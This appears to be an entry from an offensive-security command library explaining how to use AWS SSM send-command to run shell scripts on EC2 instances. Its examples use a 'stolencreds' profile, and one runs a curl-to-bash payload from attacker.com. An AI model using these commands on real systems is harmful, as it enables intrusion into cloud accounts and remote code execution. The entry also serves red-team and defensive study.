---
id: 3f51bc1b-337a-48cc-9cbe-9b02cb3e8ec7
name: aws-ssm-send-shell-script-command
type: command
executor: bash
data: >-
  aws ssm send-command --instance-ids "$_INSTANCE_ID" --document-name
  "AWS-RunShellScript" --comment "$_COMMENT" --parameters
  commands="$_SHELL_SCRIPT" --output text --query "Command.CommandId" --profile
  $_PROFILE --region $_REGION
output: null
created_at: '2023-04-06T03:56:09.691431Z'
updated_at: '2023-04-10T20:20:49.939502Z'
platforms:
  - AWS
tags:
  - aws
  - ssm
  - execution
verified: true
validated: true
---

# aws-ssm-send-shell-script-command

## Command

```bash
aws ssm send-command --instance-ids "$_INSTANCE_ID" --document-name "AWS-RunShellScript" --comment "$_COMMENT" --parameters commands="$_SHELL_SCRIPT" --output text --query "Command.CommandId" --profile $_PROFILE --region $_REGION
```

## Description

This command sends a shell script to an EC2 instance via AWS SSM for remote execution, useful for running reconnaissance, payloads, or maintenance tasks without direct access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --instance-ids $_INSTANCE_ID | Comma-separated list of EC2 instance IDs (e.g., i-1234567890abcdef0) | Yes |
| --document-name | SSM document to use (AWS-RunShellScript for shell commands) | Yes |
| --comment $_COMMENT | Optional description of the command (e.g., IP Config) | No |
| --parameters commands="$_SHELL_SCRIPT" | The shell commands to execute (e.g., ifconfig or curl ...) | Yes |
| --output text | Output format (text for simple ID retrieval) | Yes |
| --query "Command.CommandId" | Extract the command ID from response | Yes |
| --profile $_PROFILE | AWS CLI profile with send-command permissions | Yes |
| --region $_REGION | AWS region of the instance | Yes |

## Examples

### Basic Usage

```bash
aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='whoami' --output text --query "Command.CommandId" --profile stolencreds --region us-east-1
```

### With Malicious Payload

```bash
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --parameters commands='curl http://attacker.com/payload.sh | bash' --output text --query "Command.CommandId" --profile stolencreds
```

## Expected Output

```
12345678-1234-1234-1234-123456789012
```

The command ID is returned on success; use it to check invocation status.

## Related

- [[commands/aws-ssm-list-command-invocations]]
- [[procedures/aws-ssm-command-execution-ec2-shell-script]]
